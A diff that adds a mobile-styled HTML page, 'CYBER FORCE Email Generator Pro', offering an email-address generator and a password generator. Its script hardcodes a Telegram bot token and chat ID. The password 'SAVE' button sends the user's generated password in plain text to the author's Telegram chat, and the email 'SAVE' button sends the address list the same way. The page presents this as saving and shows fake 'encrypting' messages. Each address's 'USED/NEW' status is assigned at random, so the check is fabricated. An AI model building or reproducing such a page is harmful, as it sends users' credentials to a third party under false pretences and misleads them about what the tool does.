@@ -1,0 +1,1075 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CYBER FORCE | Email Generator Pro</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden;
+            background: #0a0a0a;
+            color: #fff;
+        }
+
+        body {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Background Videos - FIXED FOR MOBILE */
+        #bg-video-main {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+            filter: brightness(0.25) contrast(1.2);
+        }
+
+        #bg-video-right {
+            display: none; /* Hidden on mobile for performance */
+        }
+
+        /* Overlay */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(10,10,10,0.95) 0%, rgba(0,20,40,0.92) 100%);
+            z-index: -1;
+        }
+
+        /* Header - MOBILE OPTIMIZED */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            background: rgba(0, 15, 30, 0.92);
+            backdrop-filter: blur(15px);
+            border-bottom: 2px solid #00ffea;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            width: 100%;
+            flex-shrink: 0;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            font-size: 2rem;
+            color: #00ffea;
+            animation: pulse 2s infinite;
+        }
+
+        .logo-text {
+            font-size: 1.4rem;
+            font-weight: 800;
+            background: linear-gradient(45deg, #00ffea, #0080ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 15px rgba(0, 255, 234, 0.3);
+            line-height: 1.2;
+        }
+
+        .brand-subtitle {
+            font-size: 0.75rem;
+            color: #80ffea;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        .header-info {
+            font-size: 0.8rem;
+            color: #00ffea;
+        }
+
+        /* Main Container - FIXED LAYOUT */
+        .container {
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            padding: 15px;
+            gap: 15px;
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        /* Mobile First Layout */
+        .left-panel, .right-panel {
+            width: 100%;
+            background: rgba(0, 12, 24, 0.92);
+            border-radius: 15px;
+            padding: 20px;
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(0, 255, 234, 0.2);
+            box-shadow: 0 5px 25px rgba(0, 150, 255, 0.2);
+        }
+
+        .left-panel {
+            order: 2;
+            margin-bottom: 15px;
+        }
+
+        .right-panel {
+            order: 1;
+        }
+
+        /* Loading Section - IMPROVED */
+        .loading-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px 0;
+        }
+
+        .loading-title {
+            font-size: 1.8rem;
+            margin-bottom: 25px;
+            text-align: center;
+            color: #00ffea;
+            text-shadow: 0 0 10px #00ffea;
+            line-height: 1.3;
+        }
+
+        .loader {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: conic-gradient(transparent, #00ffea);
+            animation: spin 1.5s linear infinite;
+            position: relative;
+            margin-bottom: 25px;
+        }
+
+        .loader::before {
+            content: '';
+            position: absolute;
+            top: 8px;
+            left: 8px;
+            right: 8px;
+            bottom: 8px;
+            border-radius: 50%;
+            background: rgba(0, 12, 24, 0.95);
+        }
+
+        .loading-text {
+            font-size: 1rem;
+            color: #80ffea;
+            margin-top: 15px;
+            text-align: center;
+            animation: fadeInOut 2s infinite;
+            padding: 0 10px;
+        }
+
+        /* Profile Section */
+        .profile-section {
+            margin-top: 25px;
+            text-align: center;
+        }
+
+        .profile-image {
+            width: 160px;
+            height: 160px;
+            border-radius: 50%;
+            border: 3px solid #00ffea;
+            object-fit: cover;
+            box-shadow: 0 0 25px rgba(0, 255, 234, 0.5);
+            margin-bottom: 15px;
+        }
+
+        /* Right Panel Improvements */
+        .panel-title {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #ff00aa;
+            text-shadow: 0 0 8px #ff00aa;
+            text-align: center;
+            border-bottom: 2px solid #ff00aa;
+            padding-bottom: 8px;
+        }
+
+        .generator-section {
+            margin-bottom: 25px;
+            padding: 15px;
+            background: rgba(0, 20, 40, 0.5);
+            border-radius: 12px;
+            border: 1px solid rgba(0, 255, 234, 0.1);
+        }
+
+        .section-title {
+            font-size: 1.1rem;
+            color: #00ffea;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 6px;
+            color: #80ffea;
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 25, 50, 0.8);
+            border: 1px solid #00aaff;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 1rem;
+            outline: none;
+            transition: all 0.3s;
+            -webkit-appearance: none;
+        }
+
+        .input-field:focus {
+            border-color: #00ffea;
+            box-shadow: 0 0 12px rgba(0, 255, 234, 0.4);
+        }
+
+        input[type="range"] {
+            height: 6px;
+            -webkit-appearance: none;
+            background: rgba(0, 255, 234, 0.2);
+            border-radius: 3px;
+            outline: none;
+        }
+
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #00ffea;
+            cursor: pointer;
+            box-shadow: 0 0 10px #00ffea;
+        }
+
+        /* Button Groups - MOBILE FRIENDLY */
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .btn {
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            min-height: 50px;
+            width: 100%;
+        }
+
+        .btn-generate {
+            background: linear-gradient(45deg, #0080ff, #00ffea);
+            color: #000;
+        }
+
+        .btn-generate:active {
+            background: linear-gradient(45deg, #00ffea, #0080ff);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 255, 234, 0.3);
+        }
+
+        .btn-add {
+            background: linear-gradient(45deg, #ff00aa, #ff5500);
+            color: #fff;
+        }
+
+        .btn-add:active {
+            background: linear-gradient(45deg, #ff5500, #ff00aa);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(255, 0, 170, 0.3);
+        }
+
+        .btn-copy {
+            background: linear-gradient(45deg, #00cc66, #00ffaa);
+            color: #000;
+            padding: 10px 15px;
+            min-height: auto;
+        }
+
+        .btn-copy:active {
+            background: linear-gradient(45deg, #00ffaa, #00cc66);
+            transform: translateY(-2px);
+        }
+
+        /* Results Section */
+        .results-section {
+            background: rgba(0, 10, 20, 0.8);
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 15px;
+            border: 1px solid rgba(0, 255, 234, 0.1);
+            max-height: 250px;
+            overflow-y: auto;
+        }
+
+        .result-item {
+            padding: 10px;
+            margin-bottom: 8px;
+            background: rgba(0, 35, 70, 0.6);
+            border-radius: 6px;
+            border-left: 4px solid #00ffea;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.9rem;
+        }
+
+        .result-email {
+            font-weight: 500;
+            color: #80ffea;
+            word-break: break-all;
+            padding-right: 10px;
+            flex: 1;
+        }
+
+        .result-status {
+            font-size: 0.75rem;
+            padding: 3px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+            white-space: nowrap;
+            flex-shrink: 0;
+        }
+
+        .status-available {
+            background: rgba(0, 255, 0, 0.2);
+            color: #00ff00;
+        }
+
+        .status-used {
+            background: rgba(255, 0, 0, 0.2);
+            color: #ff5555;
+        }
+
+        /* Footer - MOBILE OPTIMIZED */
+        .footer {
+            background: rgba(0, 10, 20, 0.95);
+            padding: 15px 20px;
+            border-top: 1px solid #00aaff;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 100%;
+            flex-shrink: 0;
+            margin-top: auto;
+        }
+
+        .creator-info {
+            font-size: 0.8rem;
+            color: #80aaff;
+            line-height: 1.4;
+        }
+
+        .creator-info strong {
+            color: #00ffea;
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+        }
+
+        .social-link {
+            color: #80ffea;
+            font-size: 1.3rem;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: rgba(0, 255, 234, 0.1);
+        }
+
+        .social-link:active {
+            color: #00ffea;
+            transform: translateY(-2px);
+            background: rgba(0, 255, 234, 0.2);
+        }
+
+        /* Animations */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.8; transform: scale(1); }
+            50% { opacity: 1; transform: scale(1.05); }
+            100% { opacity: 0.8; transform: scale(1); }
+        }
+
+        @keyframes fadeInOut {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+
+        /* Desktop Optimization */
+        @media (min-width: 768px) {
+            .header {
+                padding: 20px 40px;
+            }
+
+            .logo-text {
+                font-size: 1.8rem;
+            }
+
+            .container {
+                flex-direction: row;
+                padding: 20px;
+                gap: 20px;
+            }
+
+            .left-panel {
+                flex: 0 0 45%;
+                order: 1;
+                margin-bottom: 0;
+            }
+
+            .right-panel {
+                flex: 1;
+                order: 2;
+            }
+
+            .button-group {
+                flex-direction: row;
+            }
+
+            .btn {
+                width: auto;
+            }
+
+            .footer {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+                padding: 20px 40px;
+            }
+
+            #bg-video-main {
+                width: 70%;
+            }
+
+            #bg-video-right {
+                display: block;
+                position: fixed;
+                top: 0;
+                right: 0;
+                width: 30%;
+                height: 100%;
+                object-fit: cover;
+                z-index: -2;
+                filter: brightness(0.4) hue-rotate(90deg);
+            }
+        }
+
+        @media (min-width: 992px) {
+            .container {
+                max-width: 1400px;
+                padding: 30px;
+                gap: 30px;
+            }
+
+            .left-panel, .right-panel {
+                padding: 30px;
+            }
+
+            .logo-text {
+                font-size: 2rem;
+            }
+        }
+
+        /* Scrollbar Styling */
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 30, 60, 0.5);
+            border-radius: 3px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: linear-gradient(#00ffea, #0080ff);
+            border-radius: 3px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: linear-gradient(#00ffaa, #00aaff);
+        }
+
+        /* Touch Improvements */
+        @media (hover: none) and (pointer: coarse) {
+            .btn, .social-link {
+                min-height: 44px; /* Apple's recommended touch target */
+            }
+            
+            .input-field {
+                font-size: 16px; /* Prevents iOS zoom on focus */
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Background Videos -->
+    <video id="bg-video-main" autoplay muted loop playsinline>
+        <source src="https://files.catbox.moe/ubt3hr.mp4" type="video/mp4">
+    </video>
+    <video id="bg-video-right" autoplay muted loop playsinline>
+        <source src="https://files.catbox.moe/xuwtvt.mp4" type="video/mp4">
+    </video>
+    <div class="overlay"></div>
+
+    <!-- Header -->
+    <header class="header">
+        <div class="logo">
+            <div class="logo-icon">
+                <i class="fas fa-shield-alt"></i>
+            </div>
+            <div>
+                <div class="logo-text">CYBER FORCE</div>
+                <div class="brand-subtitle">Email Generator Pro</div>
+            </div>
+        </div>
+        <div class="header-info">
+            <i class="fas fa-satellite-dish"></i> ONLINE
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="container">
+        <!-- Left Panel - Loading & Profile -->
+        <section class="left-panel">
+            <div class="loading-section">
+                <h2 class="loading-title">MAN FORCE X SYSTEM</h2>
+                <div class="loader"></div>
+                <div class="loading-text">INITIALIZING GENERATOR...</div>
+                
+                <div class="profile-section">
+                    <img src="https://files.catbox.moe/egb9s9.jpg" alt="CYBER FORCE PROFILE" class="profile-image" loading="lazy">
+                    <h3 style="color: #00ffea; margin-top: 12px; font-size: 1.2rem;">GUA MUSANG KELANTAN</h3>
+                    <p style="color: #80ffea; font-size: 0.85rem; margin-top: 5px;">
+                        MALAYSIA 2026
+                    </p>
+                </div>
+            </div>
+        </section>
+
+        <!-- Right Panel - Email & Password Generator -->
+        <section class="right-panel">
+            <h2 class="panel-title">GENERATOR SYSTEM</h2>
+            
+            <!-- Email Generation -->
+            <div class="generator-section">
+                <h3 class="section-title">
+                    <i class="fas fa-envelope"></i> EMAIL GENERATOR
+                </h3>
+                
+                <div class="input-group">
+                    <label class="input-label">Base Name:</label>
+                    <input type="text" id="baseName" class="input-field" value="cyberforce" placeholder="Enter base name">
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Number of Emails:</label>
+                    <input type="number" id="emailCount" class="input-field" value="50" min="1" max="500">
+                </div>
+                
+                <div class="button-group">
+                    <button class="btn btn-generate" id="generateEmails">
+                        <i class="fas fa-bolt"></i> GENERATE
+                    </button>
+                    <button class="btn btn-add" id="addToDatabase">
+                        <i class="fas fa-database"></i> SAVE
+                    </button>
+                </div>
+            </div>
+
+            <!-- Password Generator -->
+            <div class="generator-section">
+                <h3 class="section-title">
+                    <i class="fas fa-key"></i> PASSWORD GENERATOR
+                </h3>
+                
+                <div class="input-group">
+                    <label class="input-label">Password Length: <span id="lengthValue">16</span></label>
+                    <input type="range" id="pwdLength" class="input-field" min="8" max="32" value="16">
+                </div>
+                
+                <div class="input-group" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
+                    <label style="color: #80ffea; font-size: 0.9rem;">
+                        <input type="checkbox" id="useUppercase" checked> A-Z
+                    </label>
+                    <label style="color: #80ffea; font-size: 0.9rem;">
+                        <input type="checkbox" id="useLowercase" checked> a-z
+                    </label>
+                    <label style="color: #80ffea; font-size: 0.9rem;">
+                        <input type="checkbox" id="useNumbers" checked> 0-9
+                    </label>
+                    <label style="color: #80ffea; font-size: 0.9rem;">
+                        <input type="checkbox" id="useSymbols" checked> !@#$
+                    </label>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Generated Password:</label>
+                    <div style="display: flex; gap: 8px; align-items: center;">
+                        <input type="text" id="generatedPassword" class="input-field" readonly style="flex: 1;">
+                        <button class="btn btn-copy" id="copyPassword">
+                            <i class="fas fa-copy"></i>
+                        </button>
+                    </div>
+                </div>
+                
+                <div class="button-group">
+                    <button class="btn btn-generate" id="generatePassword">
+                        <i class="fas fa-sync-alt"></i> GENERATE
+                    </button>
+                    <button class="btn btn-add" id="savePassword">
+                        <i class="fas fa-save"></i> SAVE
+                    </button>
+                </div>
+            </div>
+
+            <!-- Results Display -->
+            <div class="results-section">
+                <h3 class="section-title" style="margin-top: 0;">
+                    <i class="fas fa-list"></i> GENERATED EMAILS
+                </h3>
+                <div id="emailResults"></div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="creator-info">
+            <strong>MAN FORCE X</strong><br>
+            GUA MUSANG KELANTAN<br>
+            MALAYSIA 2026
+        </div>
+        
+        <div class="social-links">
+            <a href="https://wa.link/spbdye" class="social-link" target="_blank" title="WhatsApp">
+                <i class="fab fa-whatsapp"></i>
+            </a>
+            <a href="https://www.tiktok.com/@mannforcex._0901?_r=1&_t=ZS-93fuO3hGKrU" class="social-link" target="_blank" title="TikTok">
+                <i class="fab fa-tiktok"></i>
+            </a>
+            <a href="https://www.instagram.com/imann.man__?igsh=ZHNla2UyZHc3bHk2" class="social-link" target="_blank" title="Instagram">
+                <i class="fab fa-instagram"></i>
+            </a>
+            <a href="t.me/ManForceX_Official" class="social-link" target="_blank" title="Telegram">
+                <i class="fab fa-telegram"></i>
+            </a>
+        </div>
+        
+        <div class="creator-info" style="text-align: right;">
+            TELEGRAM BOT<br>
+            ID: 6404359541
+        </div>
+    </footer>
+
+    <script>
+        // Telegram Bot Configuration
+        const TELEGRAM_BOT_TOKEN = '8599962337:AAFQWbWMYmYoC7HZsRSYt11wDWUWoZ9cg_Q';
+        const TELEGRAM_CHAT_ID = '6404359541';
+
+        // DOM Elements
+        const generateEmailsBtn = document.getElementById('generateEmails');
+        const addToDatabaseBtn = document.getElementById('addToDatabase');
+        const generatePasswordBtn = document.getElementById('generatePassword');
+        const copyPasswordBtn = document.getElementById('copyPassword');
+        const savePasswordBtn = document.getElementById('savePassword');
+        const emailResults = document.getElementById('emailResults');
+        const pwdLength = document.getElementById('pwdLength');
+        const lengthValue = document.getElementById('lengthValue');
+        
+        // Generated data storage
+        let generatedEmails = [];
+        let currentPassword = '';
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Set initial password length display
+            updatePasswordLength();
+            
+            // Generate initial emails
+            generateEmailList();
+            
+            // Generate initial password
+            generatePassword();
+            
+            // Setup touch event listeners for mobile
+            setupMobileEvents();
+        });
+
+        // Mobile touch optimizations
+        function setupMobileEvents() {
+            // Prevent long press on buttons
+            const buttons = document.querySelectorAll('.btn');
+            buttons.forEach(btn => {
+                btn.addEventListener('touchstart', function(e) {
+                    this.style.transform = 'translateY(-2px)';
+                });
+                
+                btn.addEventListener('touchend', function(e) {
+                    this.style.transform = '';
+                });
+                
+                // Prevent context menu on long press
+                btn.addEventListener('contextmenu', function(e) {
+                    e.preventDefault();
+                    return false;
+                });
+            });
+        }
+
+        // Password length slider
+        pwdLength.addEventListener('input', updatePasswordLength);
+        
+        function updatePasswordLength() {
+            const length = pwdLength.value;
+            lengthValue.textContent = length;
+        }
+
+        // Generate Email List
+        function generateEmailList() {
+            const baseName = document.getElementById('baseName').value.toLowerCase().replace(/\s+/g, '');
+            const count = parseInt(document.getElementById('emailCount').value);
+            
+            if (!baseName) {
+                alert('Please enter a base name!');
+                return;
+            }
+            
+            generatedEmails = [];
+            emailResults.innerHTML = '';
+            
+            const domains = [
+                'gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com',
+                'protonmail.com', 'cyberforce.io', 'manforcex.com',
+                'hackermail.com', 'securemail.com', 'darkwebmail.org'
+            ];
+            
+            const prefixes = ['x', 'pro', 'team', 'hack', 'secure', 'force', 'cyber', 'dark', 'ghost', 'shadow'];
+            const separators = ['', '.', '-', '_'];
+            
+            for (let i = 1; i <= count; i++) {
+                const separator = separators[Math.floor(Math.random() * separators.length)];
+                const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+                const randomDomain = domains[Math.floor(Math.random() * domains.length)];
+                
+                // Generate email with variations
+                let email;
+                if (Math.random() > 0.5) {
+                    email = `${baseName}${separator}${prefix}${i}@${randomDomain}`;
+                } else {
+                    email = `${prefix}${separator}${baseName}${i}@${randomDomain}`;
+                }
+                
+                const isUsed = Math.random() > 0.7; // 30% chance of being "used"
+                
+                generatedEmails.push({
+                    email: email,
+                    used: isUsed,
+                    added: false
+                });
+                
+                const emailElement = document.createElement('div');
+                emailElement.className = 'result-item';
+                emailElement.innerHTML = `
+                    <div class="result-email">${email}</div>
+                    <div class="result-status ${isUsed ? 'status-used' : 'status-available'}">
+                        ${isUsed ? 'USED' : 'NEW'}
+                    </div>
+                `;
+                
+                emailResults.appendChild(emailElement);
+            }
+            
+            // Add to results container
+            if (generatedEmails.length > 0) {
+                emailResults.parentElement.scrollTop = 0;
+            }
+        }
+
+        // Send data to Telegram
+        async function sendToTelegram(message) {
+            try {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return false;
+            }
+        }
+
+        // Generate Password
+        function generatePassword() {
+            const length = parseInt(pwdLength.value);
+            const useUpper = document.getElementById('useUppercase').checked;
+            const useLower = document.getElementById('useLowercase').checked;
+            const useNumbers = document.getElementById('useNumbers').checked;
+            const useSymbols = document.getElementById('useSymbols').checked;
+            
+            let charset = '';
+            if (useUpper) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            if (useLower) charset += 'abcdefghijklmnopqrstuvwxyz';
+            if (useNumbers) charset += '0123456789';
+            if (useSymbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
+            
+            if (charset === '') {
+                document.getElementById('generatedPassword').value = 'Select character types';
+                return;
+            }
+            
+            let password = '';
+            const cryptoArray = new Uint8Array(length);
+            crypto.getRandomValues(cryptoArray);
+            
+            for (let i = 0; i < length; i++) {
+                password += charset[cryptoArray[i] % charset.length];
+            }
+            
+            currentPassword = password;
+            document.getElementById('generatedPassword').value = password;
+        }
+
+        // Event Listeners
+        generateEmailsBtn.addEventListener('click', generateEmailList);
+        
+        generatePasswordBtn.addEventListener('click', generatePassword);
+        
+        copyPasswordBtn.addEventListener('click', function() {
+            const passwordField = document.getElementById('generatedPassword');
+            
+            // Select and copy
+            passwordField.select();
+            passwordField.setSelectionRange(0, 99999);
+            
+            try {
+                document.execCommand('copy');
+                
+                // Visual feedback
+                const originalIcon = this.innerHTML;
+                this.innerHTML = '<i class="fas fa-check"></i>';
+                this.style.background = 'linear-gradient(45deg, #00ff00, #00cc00)';
+                
+                setTimeout(() => {
+                    this.innerHTML = originalIcon;
+                    this.style.background = '';
+                }, 1500);
+            } catch (err) {
+                // Fallback for mobile
+                navigator.clipboard.writeText(passwordField.value)
+                    .then(() => {
+                        const originalIcon = this.innerHTML;
+                        this.innerHTML = '<i class="fas fa-check"></i>';
+                        this.style.background = 'linear-gradient(45deg, #00ff00, #00cc00)';
+                        
+                        setTimeout(() => {
+                            this.innerHTML = originalIcon;
+                            this.style.background = '';
+                        }, 1500);
+                    });
+            }
+        });
+
+        savePasswordBtn.addEventListener('click', async function() {
+            if (!currentPassword) {
+                alert('Generate a password first!');
+                return;
+            }
+            
+            const message = `🔒 <b>NEW PASSWORD SAVED</b>\n\n` +
+                           `Password: <code>${currentPassword}</code>\n` +
+                           `Length: ${currentPassword.length} chars\n` +
+                           `Time: ${new Date().toLocaleTimeString()}\n` +
+                           `System: CYBER FORCE GENERATOR`;
+            
+            const success = await sendToTelegram(message);
+            
+            // Visual feedback
+            const originalText = this.innerHTML;
+            if (success) {
+                this.innerHTML = '<i class="fas fa-check"></i> SAVED';
+                this.style.background = 'linear-gradient(45deg, #00ff00, #00cc00)';
+                
+                setTimeout(() => {
+                    this.innerHTML = originalText;
+                    this.style.background = '';
+                }, 2000);
+            } else {
+                this.innerHTML = '<i class="fas fa-times"></i> ERROR';
+                this.style.background = 'linear-gradient(45deg, #ff0000, #cc0000)';
+                
+                setTimeout(() => {
+                    this.innerHTML = originalText;
+                    this.style.background = '';
+                }, 2000);
+            }
+        });
+
+        addToDatabaseBtn.addEventListener('click', async function() {
+            if (generatedEmails.length === 0) {
+                alert('Generate emails first!');
+                return;
+            }
+            
+            const availableEmails = generatedEmails.filter(email => !email.used);
+            
+            if (availableEmails.length === 0) {
+                alert('No available emails!');
+                return;
+            }
+            
+            // Prepare email list for Telegram
+            let emailList = '📧 <b>NEW EMAILS ADDED</b>\n\n';
+            const displayCount = Math.min(availableEmails.length, 15);
+            
+            availableEmails.slice(0, displayCount).forEach((emailObj, index) => {
+                emailList += `${index + 1}. ${emailObj.email}\n`;
+            });
+            
+            if (availableEmails.length > displayCount) {
+                emailList += `\n...and ${availableEmails.length - displayCount} more`;
+            }
+            
+            emailList += `\n\nTotal: ${availableEmails.length} emails\n`;
+            emailList += `Time: ${new Date().toLocaleString()}\n`;
+            emailList += `System: MAN FORCE X`;
+            
+            // Send to Telegram
+            const success = await sendToTelegram(emailList);
+            
+            // Visual feedback
+            const originalText = this.innerHTML;
+            if (success) {
+                this.innerHTML = '<i class="fas fa-check"></i> SENT';
+                this.style.background = 'linear-gradient(45deg, #00ff00, #00cc00)';
+                
+                // Mark emails as added
+                generatedEmails.forEach(email => {
+                    if (!email.used) email.added = true;
+                });
+                
+                setTimeout(() => {
+                    this.innerHTML = originalText;
+                    this.style.background = '';
+                }, 2000);
+            } else {
+                this.innerHTML = '<i class="fas fa-times"></i> FAILED';
+                this.style.background = 'linear-gradient(45deg, #ff0000, #cc0000)';
+                
+                setTimeout(() => {
+                    this.innerHTML = originalText;
+                    this.style.background = '';
+                }, 2000);
+            }
+        });
+
+        // Auto-refresh loading animation
+        let loadingTextIndex = 0;
+        const loadingTexts = [
+            'GENERATING SECURE EMAILS...',
+            'CONNECTING TO DATABASE...',
+            'ENCRYPTING DATA STREAMS...',
+            'SYNCING WITH TELEGRAM BOT...',
+            'MAN FORCE X SYSTEM ACTIVE...',
+            'CYBER FORCE ONLINE...',
+            'GUA MUSANG KELANTAN...'
+        ];
+
+        const loadingTextElement = document.querySelector('.loading-text');
+        setInterval(() => {
+            loadingTextIndex = (loadingTextIndex + 1) % loadingTexts.length;
+            loadingTextElement.textContent = loadingTexts[loadingTextIndex];
+        }, 3000);
+
+        // Mobile orientation handling
+        window.addEventListener('orientationchange', function() {
+            // Small delay to allow orientation to complete
+            setTimeout(() => {
+                window.scrollTo(0, 0);
+            }, 100);
+        });
+
+        // Prevent zoom on input focus (iOS)
+        document.addEventListener('touchstart', function(e) {
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                // Do nothing - let user zoom if they want
+            }
+        }, { passive: true });
+
+        // Initial generation
+        setTimeout(() => {
+            generateEmailList();
+            generatePassword();
+        }, 500);
+    </script>
+</body>
+  </html>
